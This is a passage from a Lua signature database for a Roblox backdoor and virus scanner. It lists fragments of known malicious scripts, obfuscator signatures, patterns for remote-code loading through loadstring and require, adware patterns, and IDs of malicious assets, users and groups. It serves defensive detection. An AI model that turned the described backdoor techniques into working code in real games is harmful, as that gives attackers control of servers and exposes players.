	[[yer:IsInGroup(self.settings.WhitelistGroup) or table.find(self.settings.WhitelistedUsers, player.Name) the]],

	[[log backdoored]],

	[[aze.whitelist = require(scr]],

	[[.UpdateCode:FireServer(script.Parent.So]],

	[[Backdoored game]],

	[[rprxy.xyz]],

	[[on.Parent = Gui.LoggerFrame.S]],

	[[This is the Hardware of all Roblox games. This is like the System 32 of Roblox.
If you delete this, your game could be deleted or may just cause lag and crashes.]],

	[[https://www.psu.dev/]],

	[[discord.gg/psu]],

	[[This module is responsible for generating Script effects. Do not remove or the plugin will break. (Jerome#1018, Plugin Studios)]],

	[[This Script Manages Default Camera, Removing may cause issues both in Studio & in the ROBLOX Client]],

	[[--This script loads the songs when it's on a published game. It will give an error when testing in studio. Don't mind it]],

	[[For this script to work, in game settings under security, please enable third party teleports.]],

	[[2637091265*2+2+2+4-3+3]],

	[[5412955559]],

	[[turn on Third Party Teleports in your security tab]],

	[[1601509548]],

	[[this is not for "exploiting" purposes, this is a private admin module for me and my friends to use on our games, thanks please don't delete this since we worked hard on it <3.]],

	[[Input(input)
        local Delta = input.Position - dragStart
        local Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + Delta.X, startPos.Y.Scale, startPos.Y.Offset + Delta.Y)
        game:GetService("TweenService"):Create(Frame, TweenInfo.new(0.25), {Position = Position}):Play()
    end
    Frame.InputBegan:Connect(function(input)
        if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) and UIS:GetFocusedTextBox() == nil then
            dragToggle = true
            dragStart = input.Position
            startPos = Frame.Position
            input.Changed:Connect(function()
                if input.UserInputState == Enum.UserInputState.End then
                    dragToggle = false
                end
            end)
        end
    end)
    Frame.InputChanged:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
            dragInput = input
        end]],

	[[ragify(Frame)
    dragToggle = nil
    local dragSpeed = 0.50
    dragInput = nil
    dragStart = nil
    local dragPos = nil
    function updateInput(input)
        local Delta = input.Position - dragStart
        local Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + Delta.X, startPos.Y.Scale, startPos.Y.Offset + Delta.Y)
        game:GetService("TweenService"):Create(Frame, TweenInfo.new(0.30), {Position = Position}):Play()
    end
    Frame.InputBegan:Connect(function(input)
        if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) and UIS:GetFocusedTextBox() == nil then
            dragToggle = true
            dragStart = input.Position
            startPos = Frame.Position
            input.Changed:Connect(function()
                if input.UserInputState == Enum.UserInputState.End then
                    dragToggle = false
                end
            end)
        end
    end)
    Frame.InputChanged:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
            dragInput = input
        end
    end)
    game:GetService("UserInputService").InputChanged:Connect(function(input)
        if input == dragInput and dragToggle then
            update]],

	[[\x72\x65\x71\x75\x69\x72\x65]],

	[[_G.env=getfenv()]], --Possible remove this detection as it is unnecessary

}


--// Strings to detect obfuscation \\--

DB.Obfuscation_Detection = {
	[[SynapseXen]],

	[[Please make sure your Lua implementation supports non-null terminated strings]],

	[[Obfuscator]],

	[[_=_G; _______ = _["\x52]],

	[[iDAuBJnU6EP =]],

	[[AspectNetwork]],

	[[local BinaryEncrypted]],

	[[_G.EncodedBinary]],

	[[Luraph]],

	[[hi my 2.5mb script doesn't work with xen please help]],

	[[xen doesn't come with instance caching, sorry superskater]],

	[[,pcall,tonumber,math.random,tostring,wait or Wait,Game or game,script,Instance.new,getfenv,Workspace or workspace,next,Spawn,type]],

	[[end)(string.byte,table.insert,setmetatable)]],

	[[OBA Engine]],

	[[local R=string.byte;local Y]],

	[[:gsub("(".. ("[01]"):rep(8) .. ")"]],

	[[[string.reverse(tostring]],

	[[[tostring(string.reverse]],

	[[0x39DB7846*(2+2+2-1+2+2-4)]],

	[[tonumber(string.reverse(]],

	[[ScriptCryptV2ByAsceylos]],

	[[return(function(e,l)local X=table.insert;local s=table.concat;local A=getfe]],

	[[Cryptedrequire(]],

	[[return string.char(string.len(Bit))]],

	[[LPH!]],

	[[LPH|]],

	[[obfuscated]],

	[[IronBrew]],

	[[AztupBrew]],

}


--// Code snippets which use the string formats \\--

DB.Code_Snippets_Formats = {
	[[local%s+Updated%s*=%s*require%s*%b()%s*if%s+Updated%s*==%s%b""%sthen%s+print%b()%s*else%s+print%s*%b()%s*end]],

	[[require%b()%.StopYouHaveViolatedTheLaw%b()]],

	[[require%b():Fire%b()]],

	[[if[%.%a%d_%s]+then%s+require%s*%b()%s*%b()%s*else%s+require%s*%b()%s*%b()%s*end]],

	[[d[åäeao�]+ng[%.%s]+you got owned]],

	[[script[%.%s]+or[%.%s]+is[%.%s]+it]],

	[[require%b().daddy%(]],

	[[PlayerAdded%s*:%s*Connect%s*%(%s*function%s*%b()%s*require%s*%b()]],

	[[require%b()%.load%b()]],

	[[require%b():Run%b()]],

	[[Tazer %d+%.0]],

	[[local[%.%a%d_%s]+=%s*require%s*%b()[%.%a%d_%s]+antibackdoor%s*%b()]],

	[[local wat%s*=%s*%d+]],

	[[require%b():sliv%(]],

	[[require%b():aurora%(]],

	[[%b()%.AntiCheat%b()]],

	[[Last synced %d/%d/%d %d:%d || RoSync Loader]],

	[[string%s*%.%s*reverse%s*%b()%s*%]%s*%b()]],

	[[if%s+not%s+game%s*:%s*GetService%b()%s*:%s*IsStudio%b()%s*then%s+require]],

	[[getfenv()%[%s*string%s*%.%s*reverse(]],

	[[while%s+true%s+do%s+end]],

	[[while%s+script%s+do%s+end]],

	[[while%s+wait%s*%(%s*%)%s+do%s+end]],

	[[pwne*d]],

	[[while%s+true%s+do%s+[%.%a%d_%s]+%s*:%s*Clone%b()%s*%.%s*Parent%s*=%s*[%.%a%d_%s]+]],

	[[while%s+wait%s*%b()%s+do%s+[%.%a%d_%s]+%s*:%s*Clone%s*%b()%s*%.%s*Parent%s*=%s*[%.%a%d_%s]+]],

	[[while%s+true%s+do%s+[%.%a%d_%s]+%b()%s*end]],

	[[while%s+true%s+do[%.%a%d_%s]+=%s*Instance.new%b()[%.%a%d_%s]+=[%.%a%d_%s]+[%.%a%d_%s]+=%s*["'].-["'][%.%a%d_%s]+=[%.%a%d_%s]+wait%s*%b()%s*end]],

	[[while%s+wait%s*%b()%s+do[%.%a%d_%s]+=%s*Instance.new%b()[%.%a%d_%s]+=[%.%a%d_%s]+[%.%a%d_%s]+=%s*["'].-["'][%.%a%d_%s]+=[%.%a%d_%s]+wait%s*%b()%s*end]],

	[[while%s+true%s+do[%.%a%d_%s]+%b()%s*wait%s*%b()%s+end]],

	[[repeat%s+until]],

	[[%.%s*Volume%s*=%s*[234567890]%d]],

	[[%.%s*Volume%s*=%s*%d%d%d]],

	[[require%([%.%a%d_%s]+:%s*dataStore%b()]],

	[[while[%.%a%d_%s]+:%s*Clone%s*%b()%s*do%s+end]],

	[[OnServerEvent%s*:%s*connect%s*(%s*function%s*%b()%s*loadstring%s*%b()%s*%b()%s*end]],

	[[OnServerEvent%s*:%s*connect%s*(%s*function%s*%b()%s*loadstring%s*%b()%s*end]],

	[[require%b():protectGame%b()]],
	
	[[require%s*%b()%s*%b()%s*%b()]],

	[[OnServerEvent%s*:%s*connect%s*(%s*function%s*%b()%s*if[%s%.=%d%a_%(%)]+then%s*loadstring%s*%b()%s*%b()%s*end]],

	[[OnServerEvent%s*:%s*connect%s*(%s*function%s*%b()%s*if[%s%.=%d%a_%(%)]+then%s*loadstring%s*%b()%s*end]],
	
	[[require%b():Stys%b()]],

}


--// Obfuscation detection which use the string formats \\--

DB.Obfuscation_Detection_Formats = {
	[[[il1][il1][il1]+=string]],

	[[[il1][il1][il1]+={]],

	[[#%s*{]],

	[[[il1][il1][il1]+ = unpack]],

	[[local %a=string%.byte;local %a=string%.char;]],

	[[\[123456789]+\[%d]+\[%d]+\[%d]+]],

	[[Synapse%s*Xen]],

	[[[il1][il1][il1][il1][il1]+%s*=]],

	[[function [il1][il1][il1][il1][il1]+%(]],

	[[["'%s,]+[01][01][01][01]+["'%s,]+[01][01][01][01]+["'%s,]+[01][01][01][01]+["'%s,]+[01][01][01][01]+]],

	[[pcall%(require,%a%(%a:sub%([%d]+%)%)]],

	[[RiftX[il1][il1][il1]+]],

	[[local%-%-%[%[]],

	[[local%s+%-%-%[%[]],

	[[[%w_%.]+%+%d+ end;return table%.concat%b()end;local [%w_%.]+=[%w_%.]+%(']],

	[[[%d%a_]+%[%d+%]%.%.[%d%a_]+%[%d+%]%.%.[%d%a_]+%[%d+%]%.%.[%d%a_]+%[%d+%]%.%.[%d%a_]+%[%d+]],

	[[\x[%x]+\x[%x]+\x[%x]+\x[%x]+]],

	[[string%.byte%(%s*%d+%s*,%s*%d+%s*,[%s%d,]+%)]],

	[[getfenv()%s*%[]],

	"[^(_%w)]require%s+[^%(]",

	"[^(_%w)]require[^%s_%w%(]",

	"[^(_%w)]getfenv%s+[^%(]",

	"[^(_%w)]getfenv[^%s_%w%(]",

	"[^(_%w)]setfenv%s+[^%(]",

	"[^(_%w)]setfenv[^%s_%w%(]",

}

-- // Formatted adwere detection

DB.Adware_Detection_Formates = {
	[[PlayerAdded:connect%(function%b()%s*if%s+not%s+[%w%d_]+:PlayerOwnsAsset%b()%s*then%s+[%w%d_]+:PromptPurchase%b()%s+end%s+end%)]],

	[[local%s+[%w%d_]+%s*=%s*[%w%d_]+:GetService%("MarketplaceService"%)%s*for [%w%d_]+,%s*[%w%d_]+ in [i]?pairs%b()%s*do%s+market:PromptPurchase%(]],

	[[for [%w%d_]+,[%w%d_]+ in pairs%b() do%s+[%w%d_]+:Teleport%b()]],

	[[PlayerAdded:Connect%(function%b()%s+[%w%d_]+:Teleport%b()]],

	[[for [%w%d_]+,[%w%d_]+ in pairs%b() do%s+[%w%d_]+:PromptPurchase%b()]],

	[[[%w%d_]+:Teleport%b()]],

	[[game%.Players%.PlayerAdded:Connect%(function%b().+game:GetService%("MarketplaceService"%):PromptPurchase%b()]],

}


-- // A list of malicious require ids. The reason there are seperated from maliciouscodesnippets is to increase performance.

DB.Bad_Require_Ids = {
	"5715556818", "5555475667", "3041175937",
	"5098883048", "5292040425", "5182026494",
	"5245156880", "5245171754", "4751241292",
	"5246374811", "4952999255", "5247019873",
	"5246507325", "5245844180", "5245638301",
	"5246249950", "5245264993", "5072873486",
	"5121269775", "4790475255", "4670913700",
	"2556021288", "5090011414", "5104777071",
	"1683222792", "5084588396", "5059012307",
	"5084744245", "5084743656", "5084743398",
	"5084743088", "5084743939", "5084743622",
	"5084743364", "5084744100", "5084743821",
	"5084743520", "5084743249", "5084742926",
	"5084762641", "4062872368", "4821417050",
	"5031529929", "4794986644", "5077231493",
	"4880027249", "5015642331", "5029199151",
	"4856317205", "4986595724", "4986541548",
	"4656102360", "5004500405", "317901985",
	"4977832031", "4617777367", "4852273118",
	"4794986906", "4850318089", "4582121027",
	"4850721608", "3664252382", "4958213401",
	"4953968226", "4921021305", "3667797501",
	"4830555922", "1501837051", "3888462881",
	"3888345526", "3888476620", "4491609670",
	"3888333956", "4797950693", "4722188262",
	"3979093751", "4725588986", "4710802387",
	"73016023", "2655056793", "4735494320",
	"4712695127", "4723753937", "4104356837",
	"3279983046", "4728931941", "2588997359",
	"2342106098", "2588355688", "4707923523",
	"4707908850", "4509414898", "4696605318",
	"4648191831", "3571206277", "3068230330",
	"3697754730", "1389106135", "3505921445",
	"855371127", "306895131", "2527899984",
	"2531777909", "2499904369", "3517374790",
	"4672757644", "2531912755", "4600242709",
	"4679935477", "4658857698", "4644097080",
	"4609898761", "3160879926", "2501525825",
	"2501549711", "3019584266", "4433921552",
	"4229612988", "4178953416", "1006051316",
	"3612801610", "3719239687", "520532182",
	"5266205158", "3856263791", "3635228248",
	"3856241656", "5406938800", "01546813029",
	"5542303780", "5283742896", "5289785933",
	"5289794324", "5410639662", "625876374",
	"400942773", "5585624332", "5481376941",
	"5656071387", "5656062561", "5770222512",
	"5490813641", "0x146ec9ad4", "5924975050",
	"5925041363", "0x1554DC1B0", "5151855975",
	"5915575426", "5915578889", "5915565317",
	"5915563830", "5465382803", "5505301502",
}


--// Hashes of safe scripts to prevent false positives \\--

DB.SafeScript_Hashes = {
	"6edff1c79022da7ac166072e24fec5c0c99c7c78",
	"59fc92d1eb1c511583ba166ff3a38d2667c932d5",
	"87914459cd8fbf7193290a8ff62f86bb9e294771",
	"6e3e6b42898fe82a9111752a8ff690a444079115",
	"eabf480fe6132e0b93f153e147422a9fc558573c",
	"b2ebae1020c85099fdf3be24510e9856297c612b",
	"da67537cb4bb57cb90fdc5875227d24431a8151f",
	"c38b5af3aebf503a568ea1c1ff21de436b27faa2",
	"cc5bea1899885e42e80446aea4e370cf4d0a7738",
	"3f35754795d78f10502ad96243fdb0752fbe22f1",
	"1275c6177490dde45e217b899ce0396e5e5c9568",
	"05051b746c827eb646b7988190b4d3ecde12c205",
	"ef6612ce8f3f78bbdae37c333c984ab309fbd0b1",
	"806148224bc6fe47912cf07e347bec2936ef5df8",
	"c4b32e58e917b31af526c5e166f483e9c89aa587",
	"baad2e6a3b11c6ee990fcd1038d992d3d8faa1d5",
	"5901b54cab04fea25a897fb625064b349afc8a05",
	"620f919ec69aa92309638fad9018003ab1e2cd6d",
	"39ef555061716be59ee5af978d206dacc04bebce",
	"b89c9f9f3720c36387d944949b867cb46ec18b5b",
	"d32aad42b515692fef7b42fe6a1f8fe4e03e8c25",-- Might Tea 2 Cleaner
	"08dcf035b15b4a32eb437ed1424c84158bfd6fae",
	"4a0be521173ddd9a85ef8ca7e2ba3947b0ef8ce3",
	"c8c174131ca2b407c6253c16f37204eec685cdb9",
	"d9f134163aefe78512d3fb6d6ad6c6b1361bf9e9",
	"94f3b94d5dd2f44a6f5299231305a50369194011",
	"0ee8deb16e5acb9f277b13654e12cf5fa36c8ffc",
	"af4afb476813da1fbad5965084ab9e95b08073b5",
	"8434cfd5abde451e5670b02f55319986976c7cf6",
	"874757006667ea3a2fcfb2484813614e28de4c1b",
	"c3fcb821ff984b8abf2ac43a32e9ee4f5bddb07f",
	"3e0961c04599c57eb525e2cd5caca1b6365e451e",
	"87b1f24809ad5133b1eeb19e2a48e8a04f88a748",
	"b6cbc29e689084465fdd6363b1a00b2c3f33552c",
	"a9e433a11227c86d3ca2d34306076afb3e539d31",
	"d9b6491e8de59233da9c9ab6fe859857724826d5",
	"a81972d85ed10202bbe66f38e5c150e1e36dc4e8",
	"a510c95b66a15774e1abb67d8fc9f1b9669360e7",
	"13a54c8f38fecbefb72200bbae5957825b185594",
	"d6f5aa4ba3bbd711ba9459cc5af61445283cffd0",
	"4e9f3197dcb2287a40efdb1bb57389910cba4887",
	"4707ba8e07688ec86a419f4cdecba6fe824ebe9c",
	"5aa357d0f91c0d781832f6edf681a78ee686a647",
	"80ad6be5c0ef13e18084a745f7d0274ce4ef6429",
	"3aedc88cc86b7ae9c81dd11c182e507515556a35",
	"fd7db11cb142a406381184b11ed35132b6cb7888",
	"e3260aefb988eddb65435bdea614c51c1620dc38",
	"5287320b24f4b0d29d0483d42a194df902a32357",
	"bb1aeab4f8a6b94461cc599451b29e62309d1b14",
	"9f530860116adddc07f9d75659835b98e1a4a7b3",
	"53c1a686d7531b8437e14764b005a1671e012c42",
	"4528a3aeb5af2d5ad7a52a8d49e1b36af31a971f",
	"cec7f5a648974de2a412a763e6bec13201871e06",
	"f77154aec93a545b09a14181bbff96c7ebde357c",
	"1115a801623a54a846345cb5b11d9b673aa323a1",
	"3924eda6c34a707407ae305c1e0eff0bd70734c5",
	"cefabb4dd1dc503af46f2c420eec00e854964af3",
	"8934fa30674f56538f13b7e92e46d39c70aa8ff3",
	"08a7c1bb6eb13c89509aa87585dadd0bf6aba6b5",
	"0dbda80c62c65768f19ebf25c412c1ef0ff6680a",-- Ro protect animation script
	"c04408f20ec54b25e31af725da8e6fb74b590fa6",-- Anti Virus PRO used by Vira Killer
	"5500520289d3cbb76fe6dcfd46d70ab37fb6065b",-- Falcon Scripting art script
	"7c869595d654672b3179534dad0191b4c0821c75",-- Doggity anti Virus
	"c0da21c3df467638fe72dc2989060ff16395b9f1",-- Doggity main AV module
	"97b5a72ae05619981d63bf02a67b1c26be3d61bb",
	"db88ea53e260c2b900db902871a6ce5beaac62e6",
	"586d7ce4a3b256f7517c154625aa969421315a81",
	"7f1360d1a3e05d8ee1d068d22456f82228aa8ad4",
	"9cf4cd56ee4fb1902984628ef607e1c64825c647",-- Doggity AV UI
	"321f68645f41d62c63a483fb0ac4f47be11ea2e6",-- Ro Protect UI element
	"42a5e52a35a8731eadd73b5cd1a3b71196afe0f4",-- RoProtect main
	"9ec4fa956c5cf9155dbeeec71aa8a210c9cf00bf",-- RoProtect UI element
	"31da2d602dc0680650c1c81bc18caa6d1d31f4b9",-- RoProtect scanner
	"96574ccef8f46493797b7c0738975f13231707a5",-- Ro protect UI element
	"1106226cfd0a0290ebd194727d2b75f8457359b6",-- RoProtect UI element
	"7872286d4ca33dc0d69ab1007f02ebbd37365635",
	"9bc6837144511d33fa57ee36823efded3c2e292d",-- RoProtect READ ME detection notice
	"94420ff7dc84e3bc9067d48848f0ee92f5564539",-- Stravant resize align
	"e6de5cef63c0385de710c1eca4e48c493432ca99",-- Ro Defender
	"e3a46c9787950ec2c95477359e992e51a5aa4a67",-- Ro Protect launcher
	"0a5f4f85cbc3fcf3ec59104c08dbd31f38096536",-- RoProtect scanner
	"042eef9450b6a33c165acab4c0d529e3cf420664",
	"5bad26f74ecbb0fd96b0d397031106acc5165868",-- Server Defender Core
	"38c48160b814339219f70a660caae7d78f409117",-- Ro Protect viruses found UI updater loop
	"765c2c7565b31fb752f4e8fcf3c651c0271ddf88",-- Ro Protect viruses found UI updater loop
	"7d64b462ea08c1c150496bf3dea15b3b4925b2c9",
	"af81debe99b3dd18a0329396fb7a9f8839838a54",
	"8327550b9c4653b621f22d0ada170669533a2196",-- Venom main script
	"a1ddc0c932cb814fee2fe6fb0bdc140b8b458519",-- Hidden infection scanner
	"340d89d2d84af294e9177b8cb836f535c0cf6bde",-- Known infections table Infection Remover
	"5f00e11b44dc36811f23a6f28f8a4e91d05e72f3",-- Known infections table Infection Remover
	"f964749da3a94dd1f3561534ea7daabe3ec61765",
	"fccda405abd42a076bc40761394cf49e6f8e6d37",
	"17520ae0cdfc91ec1e6c6ace77ee4a65aaa0c5de",
	"dbb7aeb46f04e173cb5f02310994c37de6c7ba86",
	"02ed78fd218da3bb0a0729313ba4694a3b4ddad0",-- Adonis change log
	"06106cf81cd3eb8769ffc59f5e9981a8657d010f",-- Welding script
	"1b770aae7762befc195c99d7f962bee8a609a8c6",-- Adonis Anti exploit client
	"b4a063bb8b474cd175206b4635d57db945102625",-- Adonis Commands module
	"3f6d9be0a483985684b1574339d06666c34e6f16",-- Anti Virus - https://www.roblox.com/library/77495793/AntiVirus-Free
	"9afd0ad5997fc6096e1d7de65c74dbdf06f75a8d",-- LockSmith backdoor scanner module
	"d057a2e20d7806f898eb7dc9dc39f38a0dc688e8",-- LockSmith main
	"25916b919090b719afdf8f8e1d93abebd45deace",-- GameGuard V2
	"a38c655440255629850293bd54151885f9cbdc63",-- Kronos Backdoor Scanner
	"f3a1604bf65eb771be2c0b3f5bfb8ed0fa7a02ce",-- Lord starrks anti virus
	"69b6e8c1250af42432f40354d2c1d9acfc7e96cd",-- Lord starrks Plugin Data
	"7bc8df6748ee1d8ccbf031e5bca3c15f4071c222",-- ACE anti virus
	"4caa4f26c8c32a8ed8734bdb03cb77ae3dff6d9a",-- Script Quarantine - https://www.roblox.com/library/5707182290/Script-Quarantine
	"a9283194820e9ba1f960589a64a1a3be4a59da7f",-- Roblox Default Chat "ChatMain"
	"411c094000106ef4ee9343c14b6135dffe88891d",-- Roblox Default Chat "ChatWindow"
	"0bb97ff040609ce22e9e35172f674d0e9322d81d",-- EISS ChangeLog
	"9eec77535fbe413c67799cfd42f96e932391d2d8",-- EISS Loader
	"1c277e46179cfdbf832d1d063a9c8dd5d655fc4b",-- EISS MainModule
	"6313f98b61a073a3f90a9b3a65a6a159686c60db",-- Avelos Admin loader - Note don't use Avelos Admin / Novus server manager for anti virus or for anti exploit. It contains neither.
	"292b8eb7914ba8ab7cc1ba73f12e16b01f6b4d75",-- Avelos Admin Settings - Note don't use Avelos Admin / Novus server manager for anti virus or for anti exploit. It contains neither.
	"9387f3a7a2bfbdaf3f7964b7f1dc2762abfcd5fc",-- Scriptos archimedes gui module
	"e78e9aa1d683278e87c02035985c8d71579c6a9e",-- Realism mod day and night cycle script
	"b95b31659137f27377c26fdb77a5b71d34f8b0c7",-- Edge align script
	"f7b6c56bf0c5f703d8627cfbf70476eb9bfa661a",-- Gap Fill script
	"1854ac7ba0e3b195e7872135d798630d6dfad017",-- Gap Fill script
	"99989baccc05b222e0dec4a423b11d46448cd4f7",-- Realism mod main script
	"01195109718092dfa7ac65d977c7a234b9f5d88d",-- Multi move script
	"befcb80c8b90b623bcc5c0ab9dd10f4adca68ea6",-- Resize align
	"e21bb5ae30b494696ef07b924a2ac22297c31ff3",-- Resize align
	"b24ece42fe6ea28ba181da0a5b239296ae5e6c6b",-- Adonis client anti
	"8ba40eb6cdb9173d18a61d73127c38278c74a155",-- Adonis server anti
	"569071334d8bc5cef07f9cd53217d00c4ff12b89",-- Adonis commands module server
}


--// A List of safe model ids which the scanner might otherwise detect. \\--

DB.SafeModelIds = {
	2732065843,3239236979,2373501710,359948692,
	3516848054,1868400649,3239236979,5227878809,-- Note don't use Avelos Admin / Novus server manager for anti virus or for anti exploit. It contains neither.
	518094091,512742721,
}


--// A List of safe plugin ids which the scanner might otherwise detect. \\--

DB.SafePluginIds = {
	5121131624,167126759,3499696546,2778962144,
	142273772,5476045255,3550088966,2670956620,
	4917364372,165534573,5363437288,5054344511,
	381046418,142959977,4216304328,164968707,
}


-- // A list of bad groups which upload malicious assets.. \\--

DB.MaliciousGroups = {
	7688235,8970878,8885901,
}


-- // A list of bad users which upload malicious assets. \\--

DB.MaliciousUsers = {
	1002263925,1778676153,1751088619,350082947,
	1833012727,222104580,1738467,688023197,
	1841476885,1841508913,1418091035,1824492836,
	1749134566,1832231975,1038536936,2260459174,
	1774330368,2237418592,1497549110,1497549110,
	1512832628,1469981953,105726832,1244515668,
	1106114479,1070164424,1111131141,521887129,
	1035617150,1341168988,2408917517,
}

--// A List of the known malicious plugin ids \\--

DB.MaliciousPluginsIds = {
	3505516906,3970514733,160457204,
	3979966687,3620029023,3614280305,
	3109259288,2631801555,3511788021,
	2715008764,4018527477,2631594863,
	2661950443,2644964458,2631801555,
	2644964457,2715008764,2672245855,
	3442672940,2644964454,2672245883,
	678183094,419740683,418773926,
	3703353560,3703352523,3703351017,
	3703349786,3703348425,3703346260,
	3702576437,3702575401,3702574362,
	3702468367,3702440544,4546947541,
	4577953821,4577956662,4577972750,
	4577962379,4600011400,4568630998,
	4593798746,4597853145,4598298121,
	4569667445,4602311885,4628794065,
	417843035,415256575,414993280,
	4518886395,4518890979,3702425881,
	414961308,414903118,113364861,
	2672245890,3448124880,3510360729,
	2644964449,2661950467,2661950445,
	2613864560,2661950461,2623611354,
	2634252959,2760053105,2623611352,
	2760053108,2623611348,3664816543,
	2787024683,3622467610,3736586479,
	4503953645,2656826153,3703347385,
	4625982623,4616198606,4593270188,
	4633612096,4634338975,4633518679,
	4628852963,4633534454,4633530934,
	4633200718,4628849504,4668541405,
	4657683663,4633509953,4669754547,
	4674921046,4657772222,4657680834,
	4657680085,4657686498,4657688259,
	4657687313,4686277808,3282101835,
	3610985790,3620916359,3510445485,
	2787024663,2655565054,3664187642,
	3328292627,3745147634,3505506129,
	3633794640,3320045603,3320031385,
	3328279741,3665828829,3390238326,
	2338336838,3442596285,3504329550,
	3976193892,3970465753,3976174426,
	3976195272,3976620715,3976656034,
	3873491088,3873465874,3873455886,
	3873448321,3873428841,3873416714,
	3980010832,3970392013,3901419807,
	3351300478,1198363829,1997381523,
	1119510530,869690527,415001366,
	1198092634,489937255,481912220,
	419847782,419811925,564265857,
	2748528182,4488609078,3397500272,
	4307056497,152153809,1331655594,
	342137348,151643348,878662641,
	146500006,926641903,167776461,
	191804266,1112477793,147593918,
	997531218,4652646115,763983652,
	2516571913,176319945,148950613,
	596379408,163634534,3483627366,
	4289490895,160936671,4439105154,
	1231813337,176319475,308038221,
	4690697777,2995137842,1037757090,
	4702136078,4702156010,4662650784,
	4657771270,4347968267,2531454958,
	4499231340,338338840,4716099159,
	4709361587,4601168640,4523278668,
	4613885366,4669681223,4655911306,
	4633696910,4560358824,4560356232,
	4538623931,4538677941,4534271421,
	4863624219,4864404814,4863366172,
	4880083102,4840245745,4880091950,
	4895471408,4911695732,4840216320,
	4912828815,4906877502,4912091139,
	4840285073,4898923432,4898865604,
	4898878619,4898887674,4898872376,
	4821335776,4910680615,4910338914,
	4821333460,4840189322,4804846446,
	4804812511,4908614373,4836591095,
	4836629250,4840240382,4840224100,
	4840163679,5718315875,4840229959,
	4840203826,4840252644,4840264628,
	4908612183,4919389349,4927307181,
	5168986922,5178525288,5045212184,
	4924745178,4923868340,4915083418,
	4939617069,4928568267,4894275766,
	4936378192,4932813865,4932863914,
	4932985702,4933083314,4932847496,
	4933096162,4941155360,4932069538,
	4915184857,4936514169,4940243760,
	4482353592,4283450281,4256564289,
	4231014616,4670463703,4041585502,
	4025486134,4041588010,4582428104,
	4729364572,4728617712,4728565883,
	3288058696,4732731595,3104443226,
	5238319033,5238194706,5236577579,
	4025488082,4737754167,1198456932,
	2656826137,1290037705,1198079690,
	4742850465,4742479164,4739087546,
	4742480404,4742433843,4744903156,
	4742708820,4741880451,4748072103,
	4977844047,5672762836,4967780035,
	4973200479,4972877968,4990151940,
	4982478536,4958365277,4989287444,
	4936718404,4840580832,4970546106,
	5019575699,4964521519,4856854139,
	659505827,4986626405,4970533346,
	5027682272,4977495041,4958219750,
	5029907851,5015741150,4952829958,
	5056462914,5074555023,5075697531,
	5065586601,5064712799,5075679388,
	5038232215,4912077003,5080927687,
	5080856164,5080831932,5080937295,
	5236497880,5237977152,5237976166,
	5712265461,4840199487,5722873873,
	5077323623,4830142810,4139197388,
	4769994836,4018546695,4830007552,
	4239065681,4830114913,4491619986,
	5238096515,5236505999,5236632984,
	5237917613,5230649809,5217889232,
	4752603939,4830047158,5104803179,
	5109887609,5108497694,5110448949,
	5236503476,4921924503,5183204511,
	5110767026,5110770976,5110772207,
	5110769524,2556480575,4986638865,
	5715181527,5112424591,5096570428,
	4965465362,5075708273,5113479234,
	5197392987,5182699573,5231878111,
	5113492594,5015865410,4937795629,
	5112436389,5112432545,5112442161,
	5236488096,5235450904,5235686274,
	4155099772,3146633195,4880088583,
	4155117338,4975049081,4532147242,
	4744892446,4671121406,5096569040,
	5075619331,5075658749,5096595109,
	5096594269,5096771564,5096569545,
	5096569510,5654151077,5096593123,
	5403343851,5410889588,5407764933,
	5408308240,5422739108,5383736664,
	5096594235,5096594172,5096593191,
	5096594325,5722540246,5723115479,
	5096594241,5096594231,5096593915,
	5096772441,4953292509,5096569489,
	5096577062,5096568629,5096569357,
	5096594308,4986642238,5096594254,
	5096594153,5096569453,5096786434,
	5724055406,5096597911,5096594271,
	5132864684,5429961553,5422357461,
	5096576794,5096593657,5096594442,
	5096577008,5096593547,5096568671,
	5096598275,5096594323,5096594195,
	5096771672,5096594168,5096597904,
	5096771514,5096592968,5096568546,
	5096772437,5096725562,5096599422,
	5403750512,5096594167,5096593407,
	5096630055,5414975959,5385495025,
	5966875140,5967612588,5879252454,
	5096568443,5096568300,5096593616,
	5096569097,5096578249,5096569178,
	5096772028,5096577144,5096568312,
	5096568322,5096772477,5096592850,
	5096594282,5096593092,5096568836,
	5096598015,5096592997,5096594152,
	5410343999,5429661174,5351664164,
	4832621975,5096595082,5096577125,
	5096786535,5096593343,5096594946,
	5096577430,5096592873,5096787531,
	5096577295,5130468231,5149168509,
	5115257344,5122911840,5123201848,
	162333086,4986783068,5123159337,
	2658217401,4693394127,4908888339,
	4830040113,4986649465,4986652848,
	3068834603,4779181340,4861898716,
	4041634577,5722654846,5723264887,
	5722775429,5722907035,5722593656,
	5722949253,5724210249,5722819439,
	5724007355,5723016100,5724134539,
	5724079620,5724278580,5722705373,
	5353634327,3001328804,5272472510,
	4986656560,5654125826,5600686528,
	5562094099,5748052672,5755604315,
	5805271899,5197163142,5606531511,
	5289019192,5755535742,5075686331,
	5647231678,5820976894,5815216891,
	5801408229,5801398057,5854191420,
	5677325089,5843091782,5770454604,
	5606857399,5821576411,5727681596,
	5988685767,5992220373,5992208150,
	5957226629,5977013203,
}

return DB